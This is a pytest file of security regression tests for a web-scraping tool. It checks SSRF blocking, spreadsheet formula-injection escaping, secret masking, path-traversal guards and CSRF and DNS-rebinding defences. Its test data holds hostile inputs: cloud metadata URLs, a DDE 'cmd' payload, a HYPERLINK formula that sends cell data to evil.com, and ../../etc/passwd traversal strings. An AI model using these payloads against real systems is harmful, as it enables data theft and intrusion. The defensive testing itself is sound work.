"""Security regression tests.

Each test here corresponds to a real vulnerability that was found by auditing
the running system, not a hypothetical one.
"""

from __future__ import annotations

import asyncio
import csv
import json
import subprocess
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from nestick.config import Settings  # noqa: E402
from nestick.export import Exporter  # noqa: E402
from nestick.http import Fetcher  # noqa: E402
from nestick.models import Contact, ContactKind, Lead  # noqa: E402
from nestick.security import (  # noqa: E402
    BlockedTarget,
    check_url,
    is_safe_url,
    safe_output_path,
    sanitise_cell,
)


# --------------------------------------------------------------------------- #
class TestSSRF:
    """A scraped link must never reach the internal network."""

    @pytest.mark.parametrize("url", [
        "http://169.254.169.254/latest/meta-data/",     # AWS credentials
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://100.100.100.100/",                      # Alibaba
        "http://localhost:8080/admin",
        "http://127.0.0.1:6379/",                       # redis
        "http://[::1]:8000/",
        "http://10.0.0.5/internal",
        "http://192.168.1.1/router",
        "http://172.16.0.1/",
        "http://100.64.0.1/",                           # CGNAT
        "http://0.0.0.0:80/",
        "http://foo.localhost/",
        "http://svc.internal/",
    ])
    def test_internal_targets_blocked(self, url):
        assert not is_safe_url(url), f"{url} should be blocked"

    @pytest.mark.parametrize("url", [
        "https://example.com/", "http://93.184.216.34/", "https://sub.acme.co.uk/x",
    ])
    def test_public_targets_allowed(self, url):
        assert is_safe_url(url)

    @pytest.mark.parametrize("url", [
        "file:///etc/passwd", "ftp://x.com/", "gopher://x.com/", "javascript:alert(1)",
    ])
    def test_non_http_schemes_blocked(self, url):
        assert not is_safe_url(url)

    @pytest.mark.parametrize("url", [
        "http://example.com:22/",      # ssh
        "http://example.com:3306/",    # mysql
        "http://example.com:27017/",   # mongo
    ])
    def test_non_web_ports_blocked(self, url):
        assert not is_safe_url(url)

    def test_ipv4_mapped_ipv6_loopback_blocked(self):
        assert not is_safe_url("http://[::ffff:127.0.0.1]/")

    def test_escape_hatch(self):
        """Intranet scraping is possible, but only when asked for explicitly."""
        assert is_safe_url("http://192.168.1.1/", allow_private=True)
        # metadata endpoints stay blocked even then
        assert not is_safe_url("http://169.254.169.254/", allow_private=True)

    def test_error_explains_why(self):
        with pytest.raises(BlockedTarget, match="metadata"):
            check_url("http://169.254.169.254/")

    def test_fetcher_blocks_at_runtime(self):
        """The guard runs inside Fetcher.get, covering mid-crawl discoveries."""
        async def go():
            s = Settings(urls=["x"], cache=False, respect_robots=False, max_retries=1)
            async with Fetcher(s) as f:
                return await f.get("http://169.254.169.254/latest/meta-data/")

        r = asyncio.run(go())
        assert not r.ok and r.error.startswith("blocked")

    def test_fetcher_allows_public(self):
        async def go():
            s = Settings(urls=["x"], cache=False, respect_robots=False, max_retries=1)
            async with Fetcher(s) as f:
                return await f.get("https://example.com")

        assert asyncio.run(go()).ok


# --------------------------------------------------------------------------- #
class TestFormulaInjection:
    """Scraped text lands in spreadsheets; it must not become a formula."""

    @pytest.mark.parametrize("payload", [
        "=cmd|'/c calc'!A1",
        "@SUM(1+1)",
        "+1234",
        "=HYPERLINK(\"http://evil.com?d=\"&A1)",
        "\tTAB",
    ])
    def test_dangerous_prefixes_escaped(self, payload):
        out = sanitise_cell(payload)
        assert out.startswith("'"), f"{payload!r} not neutralised"

    @pytest.mark.parametrize("benign", [
        "Acme Ltd", "info@acme.com", "https://acme.com", "-12.5", "-42", "",
    ])
    def test_benign_values_untouched(self, benign):
        assert sanitise_cell(benign) == benign

    def test_non_strings_pass_through(self):
        assert sanitise_cell(4.5) == 4.5
        assert sanitise_cell(None) is None
        assert sanitise_cell(7) == 7

    def _evil_lead(self):
        l = Lead(domain="evil.com", name="=cmd|'/c calc'!A1", title="@SUM(1+1)",
                 address="+1234")
        l.add([Contact(ContactKind.EMAIL, "a@evil.com", confidence=0.9)])
        return l

    def test_csv_export_is_safe(self, tmp_path):
        s = Settings(urls=["https://x.com"], output=str(tmp_path / "o"),
                     formats=("csv",))
        p = Exporter(s).write([self._evil_lead()])[0]
        row = next(csv.DictReader(p.read_text(encoding="utf-8-sig").splitlines()))
        assert row["name"].startswith("'=")
        assert row["title"].startswith("'@")
        assert row["address"].startswith("'+")

    def test_xlsx_export_is_safe(self, tmp_path):
        openpyxl = pytest.importorskip("openpyxl")
        s = Settings(urls=["https://x.com"], output=str(tmp_path / "o"),
                     formats=("xlsx",))
        p = Exporter(s).write([self._evil_lead()])[0]
        ws = openpyxl.load_workbook(p)["Leads"]
        headers = [c.value for c in ws[1]]
        row = next(r for r in ws.iter_rows(min_row=2, values_only=True))
        assert str(row[headers.index("name")]).startswith("'=")

    def test_numbers_still_sort(self, tmp_path):
        """Escaping must not turn ratings/scores into text."""
        lead = Lead(domain="ok.com", name="Fine", rating=4.5)
        lead.add([Contact(ContactKind.EMAIL, "a@ok.com", confidence=0.9)])
        s = Settings(urls=["https://x.com"], output=str(tmp_path / "o"),
                     formats=("csv",))
        p = Exporter(s).write([lead])[0]
        row = next(csv.DictReader(p.read_text(encoding="utf-8-sig").splitlines()))
        assert row["rating"] == "4.5" and row["name"] == "Fine"


# --------------------------------------------------------------------------- #
class TestSecretHandling:
    def test_keys_never_reach_exports(self, tmp_path):
        s = Settings(urls=["https://x.com"], output=str(tmp_path / "o"),
                     formats=("json",), serpapi_key="SUPERSECRET12345",
                     hunter_key="HUNTERSECRET999")
        p = Exporter(s).write([Lead(domain="a.com", name="x")])[0]
        body = p.read_text()
        assert "SUPERSECRET12345" not in body
        assert "HUNTERSECRET999" not in body

    def test_settings_repr_masks(self):
        d = Settings(query="x", hunter_key="ABCDEFGHIJ").to_dict()
        assert "ABCDEFGHIJ" not in str(d)


class TestSafePaths:
    def test_traversal_blocked_with_base(self, tmp_path):
        with pytest.raises(BlockedTarget):
            safe_output_path("../../etc/passwd", base=tmp_path)

    def test_normal_path_allowed(self, tmp_path):
        p = safe_output_path("out/leads", base=tmp_path)
        assert p.is_relative_to(tmp_path.resolve())


# --------------------------------------------------------------------------- #
PORT = 8893
BASE = f"http://127.0.0.1:{PORT}"


@pytest.fixture(scope="module")
def ui_server(tmp_path_factory):
    import os

    env = {**os.environ, "NESTICK_CONFIG_DIR": str(tmp_path_factory.mktemp("cfg"))}
    proc = subprocess.Popen(
        [sys.executable, "-m", "nestick", "ui", "--no-browser", "--ui-port", str(PORT)],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, env=env,
    )
    for _ in range(40):
        time.sleep(0.25)
        try:
            urllib.request.urlopen(f"{BASE}/healthz", timeout=2)
            break
        except Exception:
            continue
    else:
        proc.kill()
        pytest.skip("UI server did not start")
    yield proc
    proc.terminate()
    try:
        proc.wait(timeout=5)
    except Exception:
        proc.kill()


def _request(path, origin=None, host=None, method="GET", data=None):
    req = urllib.request.Request(f"{BASE}{path}", method=method,
                                 data=json.dumps(data).encode() if data else None)
    if data:
        req.add_header("Content-Type", "application/json")
    if origin:
        req.add_header("Origin", origin)
    if host:
        req.add_header("Host", host)
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status
    except urllib.error.HTTPError as e:
        return e.code


class TestWebCSRF:
    """A malicious page must not be able to drive the local control panel."""

    def test_same_origin_allowed(self, ui_server):
        assert _request("/api/status") == 200

    def test_cross_origin_read_blocked(self, ui_server):
        """Otherwise evil.com could read back your saved API keys."""
        assert _request("/api/settings", origin="https://evil.com") == 403

    def test_cross_origin_write_blocked(self, ui_server):
        assert _request("/api/start", origin="https://evil.com", method="POST",
                        data={"urls": "https://x.com"}) == 403

    def test_dns_rebinding_blocked(self, ui_server):
        assert _request("/api/settings", host="evil.attacker.com") == 403

    def test_legit_post_still_works(self, ui_server):
        assert _request("/api/settings", method="POST", data={"hunter_key": "k"}) == 200

    def test_static_assets_remain_public(self, ui_server):
        assert _request("/static/app.css", origin="https://evil.com") == 200


if __name__ == "__main__":
    sys.exit(pytest.main([__file__, "-v"]))
